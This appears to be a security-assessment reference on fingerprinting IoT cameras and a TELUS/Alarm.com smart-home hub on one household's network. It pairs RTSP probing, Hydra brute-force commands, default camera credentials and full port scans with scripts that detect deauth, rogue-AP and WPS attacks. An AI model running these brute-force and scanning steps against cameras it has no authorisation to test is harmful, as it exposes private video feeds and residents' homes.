# IoT Device Reconnaissance — Camera & Hub Fingerprinting

Techniques for identifying, fingerprinting, and assessing IoT devices discovered during WiFi surveys — especially RTSP cameras and smart home hubs.

## RTSP Camera Probing

### Capability Discovery (no auth required)

```bash
echo -e "OPTIONS rtsp://TARGET:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 3 TARGET 554
```

The `Public:` header reveals supported methods. Common capabilities:
- OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE = standard camera
- + ANNOUNCE, RECORD = DVR/NVR or software relay (GStreamer)

### Authentication Check

```bash
echo -e "DESCRIBE rtsp://TARGET:554/ RTSP/1.0\r\nCSeq: 2\r\n\r\n" | nc -w 3 TARGET 554
```

Response codes:
| Code | Meaning | Action |
|------|---------|--------|
| 200 OK | No auth required | Stream is open — immediate access |
| 401 Unauthorized | Auth required | Check WWW-Authenticate header |
| 404 Not Found | Wrong path or dormant relay | Try different paths |

### Auth Type Identification

```
WWW-Authenticate: Digest realm="RTSP Server", nonce="abc123..."
  → Digest auth: challenge-response, no cleartext password. SECURE.

WWW-Authenticate: Basic realm="RTSP Server"
  → Basic auth: base64 encoded username:password. WEAK — effectively cleartext.
```

### Brute Force with Hydra

```bash
# Digest auth — SLOW (~16 attempts/sec with 4 threads)
hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  TARGET rtsp -s 554 -t 4 -o results.txt

# Basic auth — FAST
hydra -l admin -P /path/to/wordlist.txt TARGET rtsp -s 554 -t 8 -o results.txt
```

**Timing estimates for Digest:**
- 10k wordlist @ 16/sec = ~10 minutes
- 100k wordlist @ 16/sec = ~100 minutes
- rockyou (14M) @ 16/sec = ~10 days — NOT practical

Use focused wordlists:
- `/opt/seclists/Passwords/Default-Credentials/` — vendor defaults
- `/opt/seclists/Passwords/Common-Credentials/10k-most-common.txt` — common passwords
- Custom camera-specific wordlists (brand + model + year patterns)

### Common RTSP Stream Paths

```
/                          — root (most common)
/live                      — Hikvision, Dahua
/stream1                   — Foscam, Amcrest
/h264                      — generic H.264 stream
/video1                    — Axis
/cam/realmonitor?channel=1&subtype=0  — Dahua NVR
/onvif1                    — ONVIF Profile S
/MediaInput/h264           — Bosch
/11                        — Reolink
```

## Device Fingerprinting

### MAC OUI Lookup

The first 3 bytes of a MAC address identify the manufacturer:

```bash
# Local lookup
grep "AA:BB:CC" /usr/share/nmap/nmap-mac-prefixes

# Online lookup
curl -s "https://api.macvendors.com/AA:BB:CC"
```

Key OUIs encountered in residential security:
| OUI | Manufacturer | Device Type |
|-----|-------------|-------------|
| 50:40:74 | Alarm.com | Smart home hub (TELUS SmartHome) |
| 00:13:37 | Hak5 | WiFi Pineapple |
| EC:6C:9A | TELUS | ISP router/extender |
| D4:6C:6D | eero/Amazon | Mesh WiFi |
| 3C:5C:F1 | Google/Nest | WiFi/router |
| C0:56:27 | Belkin/Linksys | Router |

### UPnP Discovery

IoT devices often expose UPnP on non-standard ports:

```bash
# Common UPnP ports to check
for port in 40928 41928 5000 8080 80 1900; do
  curl -s -m 3 http://TARGET:$port/ | grep -i "server\|model\|manufacturer\|friendly"
done

# nmap UPnP script
nmap --script upnp-info -p 40928,41928,5000 TARGET
```

Response analysis:
- `401 Unauthorized` = device is authenticated (good security)
- XML with `<friendlyName>`, `<modelDescription>` = full device info exposed
- No response = port is for a different protocol

### Reverse DNS

```bash
host 192.168.2.XXX
```

On some networks (especially Alarm.com/TELUS deployments), reverse DNS resolves MAC addresses as hostnames:
```
151.2.168.192.in-addr.arpa domain name pointer 50:40:74:34:2b:15.
```

This is a fingerprinting win — confirms the device is Alarm.com (MAC OUI 50:40:74).

### Full TCP Port Scan

```bash
nmap -p 1-65535 --open -T5 TARGET
```

IoT devices often have high-numbered ports for internal services. Document everything.

## Alarm.com Smart Home Hub

### Architecture

```
TELUS IP Cameras (.148-.150)
    │  RTSP (Digest auth)
    ▼
Alarm.com Hub (.151)
    ├─ GStreamer RTSP relay (:554) — camera feed aggregation
    ├─ HTTPS management (:6443) — authenticated admin
    ├─ UPnP (:40928, :41928) — device discovery (auth required)
    ├─ Unknown (:6080) — TCP open, no banner
    └─ High ports (:40928, :41928) — internal services
    │
    ▼
Alarm.com Cloud → TELUS SmartHome App
```

### Port Map

| Port | Service | Auth | Notes |
|------|---------|------|-------|
| 554/tcp | GStreamer RTSP | None | Dormant — no active streams. Accepts ANNOUNCE? |
| 6443/tcp | HTTPS | Yes | No anonymous access. mTLS likely. |
| 6080/tcp | Unknown | — | Open but no banner. Could be WebSocket relay. |
| 40928/tcp | UPnP | Yes (401) | Device description XML behind auth. |
| 41928/tcp | UPnP | — | Secondary endpoint. |

### GStreamer RTSP Relay Behavior

The GStreamer server on port 554:
- Responds to OPTIONS with full capability list including ANNOUNCE + RECORD
- Returns 404 on DESCRIBE (no active mount points)
- Returns 404 on SETUP (no published streams)
- Returns 404 on ANNOUNCE (may reject external publishes, or wrong path format)
- No authentication required

**Risk assessment:** If ANNOUNCE were accepted, any LAN device could publish a malicious stream. Currently appears to reject external ANNOUNCE (404), making it inert. Monitor for behavior changes after firmware updates.

### TELUS SmartHome Camera Model

TELUS-provided cameras (.148-.150) are likely Alarm.com-compatible IP cameras:
- Identical RTSP fingerprints (same firmware)
- Digest authentication (not Basic — good)
- No default credentials work
- No ONVIF, no HTTP/HTTPS, no UPnP exposure
- 401 on all DESCRIBE attempts without correct password

## Network Defense Detection Techniques

### Deauth Flood Detection

```bash
# Count deauth frames in 15-second window
timeout 15 tcpdump -i wlan1 -nn -c 500 'type mgt subtype deauth' 2>/dev/null | wc -l
# Threshold: >10 deauth frames/15s = likely attack
```

### Rogue AP Detection

```bash
# Known Ghossein BSSIDs (from initial survey)
KNOWN="A2:39:F9:2A:DA:E4|7A:7D:A1:50:06:54|2A:B8:2B:68:8B:86|7A:7D:A1:50:02:3A"

# Sweep and check for unknown BSSIDs broadcasting home SSID
airodump-ng wlan1 --band abg -w /tmp/rogue --output-format csv &
sleep 20; kill %1
grep -i "Ghossein" /tmp/rogue-01.csv | grep -vE "$KNOWN"
# Any output = rogue AP detected
```

### WPS Brute Force Detection

```bash
timeout 10 tcpdump -i wlan1 -nn -c 200 \
  'wlan.fc.type_subtype == 0x0004 and wlan.fixed.reason_code == 2' 2>/dev/null | wc -l
# >5 in 10s = possible WPS PIN attack
```

## Reference: Default Camera Credentials

Commonly tested (all failed against TELUS cameras):
```
admin:admin
admin:12345
admin:password
admin:admin123
admin:123456
admin:888888
admin:666666
root:root
root:admin
admin:telus
admin:Telus
admin:telus123
user:user
```

For production brute force, use Seclists camera-specific lists:
- `/opt/seclists/Passwords/Default-Credentials/axis_default_passwords.txt`
- `/opt/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
